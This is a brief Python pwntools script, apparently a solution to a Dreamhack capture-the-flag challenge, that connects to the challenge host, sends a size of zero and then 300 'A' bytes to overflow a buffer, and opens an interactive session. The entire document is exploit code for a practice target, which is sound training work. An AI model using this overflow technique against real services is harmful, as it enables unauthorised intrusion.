from pwn import *

p = remote("host1.dreamhack.games", 8910)

payload = 'A' * 300

p.sendlineafter("Size: ", "0")

p.sendlineafter("Data: ", payload)

p.interactive()
